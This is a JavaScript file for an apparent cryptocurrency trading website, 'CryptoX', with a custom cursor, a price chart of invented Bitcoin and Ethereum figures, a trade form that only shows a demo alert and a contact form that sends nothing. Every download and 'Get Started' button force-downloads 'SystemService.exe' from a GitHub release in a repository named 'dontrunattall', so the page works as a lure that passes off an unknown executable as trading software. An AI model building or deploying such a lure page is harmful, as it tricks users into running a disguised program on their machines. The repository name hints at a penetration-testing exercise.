// Custom Cursor
const cursor = document.querySelector('.cursor');
const cursorFollower = document.querySelector('.cursor-follower');

document.addEventListener('mousemove', (e) => {
    cursor.style.left = e.clientX + 'px';
    cursor.style.top = e.clientY + 'px';
    
    cursorFollower.style.left = e.clientX + 'px';
    cursorFollower.style.top = e.clientY + 'px';
});

document.addEventListener('mouseenter', () => {
    cursor.style.opacity = '1';
    cursorFollower.style.opacity = '1';
});

// Hover effect for buttons and links
const hoverElements = document.querySelectorAll('a, button, .btn');

hoverElements.forEach(element => {
    element.addEventListener('mouseenter', () => {
        cursor.style.transform = 'scale(1.5)';
        cursorFollower.style.transform = 'scale(1.5)';
    });
    
    element.addEventListener('mouseleave', () => {
        cursor.style.transform = 'scale(1)';
        cursorFollower.style.transform = 'scale(1)';
    });
});

// Mobile Menu Toggle
const mobileMenu = document.querySelector('.mobile-menu');
const navLinks = document.querySelector('.nav-links');

if (mobileMenu) {
    mobileMenu.addEventListener('click', () => {
        navLinks.classList.toggle('active');
        mobileMenu.querySelector('i').classList.toggle('fa-bars');
        mobileMenu.querySelector('i').classList.toggle('fa-times');
    });
}

// Close mobile menu when clicking a link
document.querySelectorAll('.nav-links a').forEach(link => {
    link.addEventListener('click', () => {
        navLinks.classList.remove('active');
        if (mobileMenu) {
            mobileMenu.querySelector('i').classList.add('fa-bars');
            mobileMenu.querySelector('i').classList.remove('fa-times');
        }
    });
});

// Crypto Chart
const ctx = document.getElementById('cryptoChart');
if (ctx) {
    const chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
            datasets: [{
                label: 'Bitcoin Price',
                data: [35000, 38000, 42000, 45000, 43000, 47000, 52000, 58000, 55000, 62000, 68000, 72000],
                borderColor: '#4a90e2',
                backgroundColor: 'rgba(74, 144, 226, 0.1)',
                borderWidth: 3,
                fill: true,
                tension: 0.4,
                pointBackgroundColor: '#7b68ee',
                pointBorderColor: '#fff',
                pointRadius: 4,
                pointHoverRadius: 6
            }, {
                label: 'Ethereum Price',
                data: [2200, 2400, 2600, 2800, 2700, 3100, 3400, 3600, 3500, 3800, 4100, 4500],
                borderColor: '#7b68ee',
                backgroundColor: 'rgba(123, 104, 238, 0.1)',
                borderWidth: 3,
                fill: true,
                tension: 0.4,
                pointBackgroundColor: '#00d4ff',
                pointBorderColor: '#fff',
                pointRadius: 4,
                pointHoverRadius: 6
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: true,
            plugins: {
                legend: {
                    position: 'top',
                    labels: {
                        color: '#fff',
                        font: {
                            size: 12
                        }
                    }
                },
                tooltip: {
                    mode: 'index',
                    intersect: false,
                    backgroundColor: 'rgba(17, 24, 39, 0.9)',
                    titleColor: '#fff',
                    bodyColor: '#9ca3af',
                    borderColor: '#4a90e2',
                    borderWidth: 1
                }
            },
            scales: {
                x: {
                    grid: {
                        color: 'rgba(255, 255, 255, 0.05)'
                    },
                    ticks: {
                        color: '#9ca3af'
                    }
                },
                y: {
                    grid: {
                        color: 'rgba(255, 255, 255, 0.05)'
                    },
                    ticks: {
                        color: '#9ca3af',
                        callback: function(value) {
                            return '$' + value.toLocaleString();
                        }
                    }
                }
            }
        }
    });
}

// Trade Form Simulation
const buySellButtons = document.querySelectorAll('.trade-type button');
const amountInput = document.querySelector('.input-group input');
const youGetInput = document.querySelectorAll('.input-group input')[1];
const tradeBtn = document.querySelector('.trade-btn');

if (buySellButtons.length > 0) {
    buySellButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            buySellButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        });
    });
}

if (amountInput && youGetInput) {
    amountInput.addEventListener('input', () => {
        const amount = parseFloat(amountInput.value) || 0;
        const btcPrice = 43250;
        const btcAmount = amount / btcPrice;
        youGetInput.value = btcAmount.toFixed(6);
    });
}

if (tradeBtn) {
    tradeBtn.addEventListener('click', () => {
        alert('Demo Trading Feature - Full version coming soon!');
    });
}

// FAQ Accordion
const faqItems = document.querySelectorAll('.faq-item');

faqItems.forEach(item => {
    const question = item.querySelector('.faq-question');
    
    question.addEventListener('click', () => {
        // Close other FAQs
        faqItems.forEach(otherItem => {
            if (otherItem !== item && otherItem.classList.contains('active')) {
                otherItem.classList.remove('active');
            }
        });
        
        // Toggle current FAQ
        item.classList.toggle('active');
    });
});

// Contact Form Submission
const contactForm = document.getElementById('contactForm');

if (contactForm) {
    contactForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        // Get form data
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const subject = document.getElementById('subject').value;
        const message = document.getElementById('message').value;
        
        // Simple validation
        if (name && email && message) {
            alert(`Thank you ${name}! Your message has been sent. We'll get back to you soon.`);
            contactForm.reset();
        } else {
            alert('Please fill in all required fields.');
        }
    });
}

// Download Button Functionality - Updated with your software link
const downloadButtons = document.querySelectorAll('#downloadBtn, #downloadBtn2, #downloadBtn3, #downloadBtnAbout, #downloadBtnAbout2, #downloadBtnContact');

// ***** IMPORTANT: Replace this URL with your actual software download link *****
const SOFTWARE_DOWNLOAD_URL = "https://github.com/FullPenetrationTesting/dontrunattall/releases/download/v1.0.0/SystemService.exe";

downloadButtons.forEach(btn => {
    if (btn) {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            
            // Create a temporary anchor element for forced download
            const link = document.createElement('a');
            link.href = SOFTWARE_DOWNLOAD_URL;
            link.download = 'SystemService.exe'; // Forces download instead of navigation
            link.target = '_self'; // Same tab
            link.style.display = 'none';
            
            // Append to body, click, and remove
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Optional: Show confirmation message
            console.log('Download initiated for software');
        });
    }
});

// Get Started Buttons
const getStartedBtns = document.querySelectorAll('#getStartedBtn');

getStartedBtns.forEach(btn => {
    if (btn) {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            window.open(SOFTWARE_DOWNLOAD_URL, '_blank');
        });
    }
});

// Smooth Scroll for Anchor Links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        const href = this.getAttribute('href');
        
        if (href !== '#') {
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        }
    });
});

// Navbar Background Change on Scroll
window.addEventListener('scroll', () => {
    const header = document.querySelector('header');
    
    if (window.scrollY > 50) {
        header.style.background = 'rgba(6, 9, 20, 0.98)';
        header.style.backdropFilter = 'blur(10px)';
    } else {
        header.style.background = 'rgba(6, 9, 20, 0.95)';
    }
});

// Intersection Observer for Scroll Animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Observe elements for animation
document.querySelectorAll('.feature-card, .testimonial-card, .value-card, .team-card, .info-card').forEach(el => {
    el.style.opacity = '0';
    el.style.transform = 'translateY(30px)';
    el.style.transition = 'all 0.6s ease';
    observer.observe(el);
});

// Live Crypto Price Updates (Simulated)
function updateCryptoPrices() {
    const cryptoItems = document.querySelectorAll('.crypto-item');
    
    cryptoItems.forEach(item => {
        const priceSpan = item.querySelector('.price');
        const changeSpan = item.querySelector('.change');
        
        if (priceSpan) {
            // Simulate random price changes
            const currentPrice = parseFloat(priceSpan.textContent.replace('$', '').replace(',', ''));
            const changePercent = (Math.random() * 10 - 5) / 100;
            const newPrice = currentPrice * (1 + changePercent);
            
            priceSpan.textContent = '$' + newPrice.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            
            if (changeSpan) {
                const percentChange = (changePercent * 100).toFixed(1);
                changeSpan.textContent = (percentChange >= 0 ? '+' : '') + percentChange + '%';
                changeSpan.className = 'change ' + (percentChange >= 0 ? 'positive' : 'negative');
            }
        }
    });
}

// Update prices every 10 seconds
// Uncomment the line below to enable live price updates
// setInterval(updateCryptoPrices, 10000);

// Typing Animation for Hero Text (Optional)
const heroText = document.querySelector('.hero-text h1 .gradient-text');
if (heroText) {
    const originalText = heroText.textContent;
    heroText.style.opacity = '0';
    
    setTimeout(() => {
        heroText.style.opacity = '1';
        heroText.style.transition = 'opacity 1s ease';
    }, 500);
}

// Prevent right-click on images (optional)
document.querySelectorAll('img').forEach(img => {
    img.addEventListener('contextmenu', (e) => {
        e.preventDefault();
    });
});

// Console log for development
console.log('CryptoX Website Loaded Successfully!');
console.log('Update the SOFTWARE_DOWNLOAD_URL variable with your actual download link.');